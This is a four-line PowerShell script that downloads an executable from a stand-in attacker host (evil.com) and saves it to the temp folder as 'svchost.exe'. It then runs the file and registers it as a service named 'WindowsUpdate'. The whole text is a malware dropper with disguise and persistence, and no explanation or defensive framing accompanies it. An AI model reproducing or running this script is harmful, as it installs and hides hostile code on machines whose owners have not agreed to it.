$url = "http://evil.com/payload.exe"
Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\svchost.exe"
Start-Process "$env:TEMP\svchost.exe"
New-Service -Name "WindowsUpdate" -BinaryPathName "$env:TEMP\svchost.exe"
